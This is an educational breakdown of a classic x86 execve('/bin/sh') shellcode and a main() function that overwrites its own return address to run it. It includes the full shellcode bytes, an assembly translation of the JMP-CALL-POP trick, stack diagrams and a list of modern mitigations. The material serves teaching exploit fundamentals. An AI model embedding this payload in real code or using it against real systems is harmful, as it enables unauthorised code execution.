# Shellcode Exploit Analysis

## Overview
This is a classic **stack-based buffer overflow / return address hijacking** exploit that executes `/bin/sh` (a shell).

---

## Part 1: The Shellcode Breakdown

```c
char shellcode[] = "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
                   "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
                   "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41"
                   "\x4b\x4b\x4b\x4b";
```

### Assembly Translation (x86 32-bit)

```asm
; \xeb\x1a         → JMP short +0x1a    ; Jump forward 26 bytes (to CALL)
; \x5e             → POP ESI            ; ESI = address of "/bin/sh" string
; \x31\xc0         → XOR EAX, EAX       ; EAX = 0 (null)
; \x88\x46\x07     → MOV [ESI+7], AL    ; Null-terminate "/bin/sh\0"
; \x8d\x1e         → LEA EBX, [ESI]     ; EBX = pointer to "/bin/sh"
; \x89\x5e\x08     → MOV [ESI+8], EBX   ; Store ptr to "/bin/sh" in argv[0]
; \x89\x46\x0c     → MOV [ESI+12], EAX  ; Store NULL in argv[1]
; \xb0\x0b         → MOV AL, 11         ; syscall number 11 = execve
; \x89\xf3         → MOV EBX, ESI       ; EBX = "/bin/sh"
; \x8d\x4e\x08     → LEA ECX, [ESI+8]   ; ECX = argv array
; \x8d\x56\x0c     → LEA EDX, [ESI+12]  ; EDX = envp (NULL)
; \xcd\x80         → INT 0x80           ; Execute syscall → execve("/bin/sh")
; \xe8\xe1\xff\xff\xff → CALL -31       ; Call back to POP ESI (pushes next addr)

; Data embedded after CALL:
; \x2f\x62\x69\x6e\x2f\x73\x68  → "/bin/sh"
; \x4a                           → 'J' (placeholder, gets null-terminated)
; \x41\x41\x41\x41               → "AAAA" (argv[0] placeholder)
; \x4b\x4b\x4b\x4b               → "KKKK" (envp placeholder)
```

### JMP-CALL-POP Technique Visualized
```
┌─────────────────────────────────────────────┐
│  JMP ──────────────────────────────────┐    │
│                                        ↓    │
│  POP ESI ←── CALL pushes return addr ──┘    │
│  (ESI now points to "/bin/sh" string)       │
└─────────────────────────────────────────────┘
```
> This avoids null bytes in the shellcode — you can't hardcode absolute addresses

---

## Part 2: The Main Function

```c
int main() {
    int *ret;              // Pointer variable on the stack
    ret = (int *)&ret + 2; // Point to the RETURN ADDRESS on the stack
    (*ret) = (int)shellcode; // OVERWRITE return address with shellcode address
}
```

### Stack Layout (x86 32-bit)

```
HIGH ADDRESS
┌─────────────────────┐
│   Return Address    │ ← ret + 2  (what we OVERWRITE)
├─────────────────────┤
│   Saved EBP         │ ← ret + 1
├─────────────────────┤
│   ret variable      │ ← &ret (current position)
└─────────────────────┘
LOW ADDRESS
```

### Why `+2`?
```
&ret        = address of local variable
&ret + 1    = saved frame pointer (EBP)
&ret + 2    = return address of main()
```
Each `+1` moves **4 bytes** (size of int on 32-bit)

---

## Execution Flow

```
main() called
     │
     ▼
ret points to return address on stack
     │
     ▼
Return address overwritten with &shellcode
     │
     ▼
main() returns → jumps to shellcode
     │
     ▼
JMP/CALL/POP trick resolves "/bin/sh" address
     │
     ▼
execve("/bin/sh", ["/bin/sh"], NULL)
     │
     ▼
   SHELL SPAWNED  🐚
```

---

## Security Concepts Demonstrated

| Technique | Description |
|-----------|-------------|
| **Stack Smashing** | Overwriting return address to redirect execution |
| **JMP-CALL-POP** | Position-independent way to get string addresses |
| **Syscall via INT 0x80** | Direct Linux kernel call (32-bit) |
| **Self-modifying data** | Shellcode writes its own null terminator |

---

## ⚠️ Important Notes

```
⚠️  This is EDUCATIONAL content only
⚠️  Modern systems have protections against this:
     - ASLR (Address Space Layout Randomization)
     - NX/DEP (Non-Executable Stack)
     - Stack Canaries (GCC -fstack-protector)
     - PIE (Position Independent Executable)
⚠️  Running this on modern systems will likely SEGFAULT
⚠️  Using such techniques without authorization is ILLEGAL
```

This is a **classic 1990s-style exploit** (similar to those described in *Aleph One's "Smashing the Stack for Fun and Profit"* — 1996).
